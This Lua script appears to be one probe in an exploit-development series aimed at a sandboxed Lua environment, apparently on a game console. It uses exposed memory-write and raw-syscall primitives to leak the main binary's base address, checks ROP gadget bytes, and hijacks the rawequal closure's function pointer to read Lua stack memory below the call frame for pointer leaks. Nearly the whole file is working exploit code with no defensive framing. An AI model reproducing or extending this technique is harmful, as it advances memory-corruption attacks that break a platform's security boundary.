-- CRASH_CLASS: MODERATE
-- PROBE 56d7: Test rax=6,7,8 gadgets for deep Lua stack read
--
-- 56d6 found: rax=6 at +0xCEF50, rax=7 at +0xDBF50, rax=8 at +0x8D2D4
-- With rawequal(111,222) and rax=N, Lua reads N values from stack top:
--   N=1: last arg (222)
--   N=2: both args (111, 222)
--   N=3: func + both args
--   N=4+: reads BELOW call frame into Lua internal state
-- rax=6 with 2 args reads 3 slots below the call frame → potential pointer leak

print("=== PROBE 56d7: RAX678 STACK LEAK ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    if type(v) == "string" then return '"' .. tostring(v):sub(1,40) .. '"' end
    if type(v) == "boolean" then return tostring(v) end
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    if type(v) == "number" then return string.format("%g", v) end
    return type(v) .. ":" .. tostring(v)
end
local function vtype(v)
    local ok, t = pcall(type, v)
    if ok then return t end return "?"
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local tlo = rd(N(info) + 0x108) or 0
local thi = rd(N(info) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end
print(string.format("eboot=0x%X%08X", thi, tlo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", thi, tlo + off))
end

local G = {}
G[0] = 0x471       -- xor eax,eax;ret
G[1] = 0x1AB0C6    -- mov eax,1;ret
G[6] = 0xCEF50     -- mov eax,6;ret
G[7] = 0xDBF50     -- mov eax,7;ret
G[8] = 0x8D2D4     -- mov eax,8;ret

-- Verify gadget bytes
print("")
print("[0] Verify gadgets")
for _, val in ipairs({6, 7, 8}) do
    local off = G[val]
    local d0 = rd(tlo + off) or 0
    local d1 = rd(tlo + off + 4) or 0
    local b = {}
    b[0] = d0 % 256
    b[1] = math.floor(d0 / 256) % 256
    b[2] = math.floor(d0 / 65536) % 256
    b[3] = math.floor(d0 / 16777216) % 256
    b[4] = d1 % 256
    b[5] = math.floor(d1 / 256) % 256
    print(string.format("  rax=%d +0x%X: %02X %02X %02X %02X %02X %02X (expect B8 %02X 00 00 00 C3)",
        val, off, b[0], b[1], b[2], b[3], b[4], b[5], val))
end

-- Get rawequal CClosure
local re_s = tostring(rawequal)
local re_a_str = re_s:match("0x([0-9a-fA-F]+)") or re_s:match(": ([0-9a-fA-F]+)$") or re_s:match(": (%d+)$")
local re_a = tonumber(re_a_str, 16) or tonumber(re_a_str)
print(string.format("rawequal=0x%X", re_a))

-- Test helper
local function deep_test(nret, label, call_fn)
    if not G[nret] or not alive() then return end
    local saved = rq(re_a + 0x20)
    pcall(function() memory.write_qword(re_a + 0x20, eaddr(G[nret])) end)
    local r = {pcall(call_fn)}
    pcall(function() memory.write_qword(re_a + 0x20, saved) end)

    local ok = r[1]
    local n = 0
    if ok then
        for i = 2, 20 do
            if r[i] ~= nil then n = i - 1 end
        end
    end
    print(string.format("  rax=%d %s: ok=%s n=%d", nret, label, tostring(ok), n))
    for i = 2, math.min(#r, 12) do
        local v = r[i]
        print(string.format("    [%d] %s (%s)", i - 1, fmt(v), vtype(v)))
    end
    if not ok and r[2] then
        print(string.format("    err=%s", tostring(r[2])))
    end
end

-- ============ TEST 1: rax=1 baseline ============
print("")
print("[1] Baseline rax=0,1 with 2 args")
deep_test(0, "re(111,222)", function() return rawequal(111, 222) end)
deep_test(1, "re(111,222)", function() return rawequal(111, 222) end)

-- ============ TEST 2: rax=6 with 2 args ============
-- Expected stack layout from top (index relative to L->top):
-- top-1: 222 (arg2)
-- top-2: 111 (arg1)
-- top-3: rawequal function object
-- top-4,5,6: previous call frame data (pcall internal, or caller stack)
print("")
print("[2] rax=6 with 2 args")
deep_test(6, "re(111,222)", function() return rawequal(111, 222) end)

-- ============ TEST 3: rax=7 with 2 args ============
print("")
print("[3] rax=7 with 2 args")
deep_test(7, "re(111,222)", function() return rawequal(111, 222) end)

-- ============ TEST 4: rax=8 with 2 args ============
print("")
print("[4] rax=8 with 2 args")
deep_test(8, "re(111,222)", function() return rawequal(111, 222) end)

-- ============ TEST 5: rax=6 with 0 args ============
print("")
print("[5] rax=6 with 0 args (reads deeper)")
deep_test(6, "re()", function() return rawequal() end)

-- ============ TEST 6: rax=8 with 0 args ============
print("")
print("[6] rax=8 with 0 args (deepest)")
deep_test(8, "re()", function() return rawequal() end)

-- ============ TEST 7: Nested — called from a deeper frame ============
-- Wrap in several function calls to see different stack depths
print("")
print("[7] Nested call: f(g(rawequal(111,222))) rax=8")
local function nest_test()
    local function inner()
        return rawequal(111, 222)
    end
    return inner()
end
deep_test(8, "nested", function() return nest_test() end)

-- ============ STABILITY ============
print("")
print("[F] Stability")
if alive() then
    print(string.format("  rawequal(1,1)=%s (1,2)=%s", tostring(rawequal(1,1)), tostring(rawequal(1,2))))
end
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56d7 COMPLETE ===")
